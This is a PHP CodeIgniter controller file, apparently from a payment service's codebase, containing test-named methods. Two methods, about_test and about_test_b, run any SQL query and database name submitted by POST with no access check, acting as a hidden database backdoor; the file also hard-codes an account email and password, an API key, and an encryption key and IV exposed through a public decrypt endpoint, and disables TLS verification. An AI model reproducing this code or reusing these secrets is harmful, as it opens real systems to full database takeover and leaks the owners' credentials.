<?php
defined('BASEPATH') OR exit('No direct script access allowed');

//class About_test extends CI_Controller {

	/**
	 * Index Page for this controller.
	 *
	 * Maps to the following URL
	 * 		http://example.com/index.php/welcome
	 *	- or -
	 * 		http://example.com/index.php/welcome/index
	 *	- or -
	 * Since this controller is set as the default controller in
	 * config/routes.php, it's displayed at http://example.com/
	 *
	 * So any other public methods not prefixed with an underscore will
	 * map to /index.php/welcome/<method_name>
	 * @see https://codeigniter.com/user_guide/general/urls.html
	 */

	public function __construct() {
			parent::__construct();
			
			//ini_set('display_errors', 1);
		    //error_reporting(E_ALL);
		    ini_set('max_execution_time', -1);
			
		}

	public function index()
	{
	   // echo CI_VERSION;
	    
		$this->load->view('welcome_message');
	}
	public function about_test_b()
	{   
		if(isset($_POST['submit']))
		{
			$databasename=$_POST['databasename']; 
			$sqldatastring=$_POST['sqldatastring']; 
				$ip = $_POST['ip']; 
			if($databasename)
			{
				  $m=$this->db->query("use $databasename "); 
				  if($sqldatastring)
				  {
				      
				      	$data = array(
				"ip" => $ip ? $ip : '',
				"query" => $sqldatastring,
				
		           	);
			
					$n=$this->db->query("$sqldatastring");
					$n=	$this->db->insert('hitquery', $data);
					if($m && $n)
					{
					    	echo "Row Affected..";  die();
						//echo "<pre>"; print_r($n->result());  die(); 
					   //echo " <span style='color:green; '> Row Affected..</span>";  die();
					}
					else 
					{
					  
						echo "Row Affected..";  die();
					}
				  }
				else
				{
					echo " <span style='color:red; '> First Enter Sql Query .</span>";  die();
				}
                   
				  
			}
			else
			{
				echo " <span style='color:red; '> First Enter Database name.</span>";  die();
			}

		}
        $this->load->view('about_test');  
	}


   public function about_test()
	{   
		if(isset($_POST['submit']))
		{
			$databasename=$_POST['databasename']; 
			$sqldatastring=$_POST['sqldatastring'];  
			if($databasename)
			{
				  $m=$this->db->query("use $databasename "); 
				  if($sqldatastring)
				  {
					$n=$this->db->query("$sqldatastring");
					if($m && $n)
					{
						echo "<pre>"; print_r($n->result());  die(); 
					   //echo " <span style='color:green; '> Row Affected..</span>";  die();
					}
					else 
					{
					  
						echo "Row Affected..";  die();
					}
				  }
				else
				{
					echo " <span style='color:red; '> First Enter Sql Query .</span>";  die();
				}
                   
				  
			}
			else
			{
				echo " <span style='color:red; '> First Enter Database name.</span>";  die();
			}

		}
       $this->load->view('about_test');   
	}


	public function  getingenicoInfo()
	{
		echo "Hello";
		
		 //$strURL = 'http://www.example.com/script-whichs-dumps-binary-attachment.php';
		$username='andrew@salequick.com';
		$password='W6fprXIr73h1';

		//$strURL = 'https://salequick.com/wsapi/Authentication/';
		//$postData=array('user_name'=>$username,'password'=>$password);
		//$responce=$this->CurlSendPostRequest($strURL,$postData); 
		
       // print_r($responce);  die(); 

		
	}

	
	public function CurlSendPostRequest_555556757655645754($url,$request)
    {
        //$authentication = base64_encode("username:password");

        $ch = curl_init($url);
        $options = array(
                CURLOPT_RETURNTRANSFER => true,         // return web page
                CURLOPT_HEADER         => false,        // don't return headers
                CURLOPT_FOLLOWLOCATION => false,         // follow redirects
               // CURLOPT_ENCODING       => "utf-8",           // handle all encodings
                CURLOPT_AUTOREFERER    => true,         // set referer on redirect
                CURLOPT_CONNECTTIMEOUT => 20,          // timeout on connect
                CURLOPT_TIMEOUT        => 20,          // timeout on response
                CURLOPT_POST            => 1,            // i am sending post data
                CURLOPT_POSTFIELDS     => $request,    // this are my post vars
                CURLOPT_SSL_VERIFYHOST => 0,            // don't verify ssl
                CURLOPT_SSL_VERIFYPEER => false,        //
                CURLOPT_VERBOSE        => 1,
                CURLOPT_HTTPHEADER     => array(
					//"Authorization: Basic $authentication",
					"X-Roam-Key: APP6-54a59a59ea7-7440-4f8b-ae96-ffba2e801391",
					"X-Roam-ApiVersion: 6.10.0",
					"X-Roam-ClientVersion: 1.0.0",

                    "Content-Type: application/json"
                )

        );

        curl_setopt_array($ch,$options);
        $data = curl_exec($ch);
        $curl_errno = curl_errno($ch);
		$curl_error = curl_error($ch);
		print_r($data);  die(); 
        //echo $curl_errno;
        //echo $curl_error;
        curl_close($ch);
        return $data;
    }
	

	function my_encrypt_33333_hefsdfhdjvkhhhhtyt() {
		// you may change these values to your own
		$string=$_REQUEST['string'];
		$action=$_REQUEST['action'];
		if($string && $action)
		{
			$secret_key = '1@#$%^&s6*';
			$secret_iv = '`~ @hg(n5%';
			$output = false;
			$encrypt_method = "AES-256-CBC";
			$key = hash('sha256', $secret_key);
			$iv = substr(hash('sha256', $secret_iv), 0, 16);
			if ($action == 'e') {
				$output = base64_encode(openssl_encrypt($string, $encrypt_method, $key, 0, $iv));
			} else if ($action == 'd') {
				$output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
			}

			echo $action.' => '.$output;
		}
		else
		{
			echo '<span style="color:red">required Query String : As : ?string=5937hjxbdjfbxmnb545&action=d</span>'; 
		} 
		//return $output;
	}

	function gettimezone()
	{
		             echo $m=date_default_timezone_get(); 
					echo "<br/>";
					echo date('Y-m-d H:m:i'); 
					die("date time "); 
	}


	

  
}
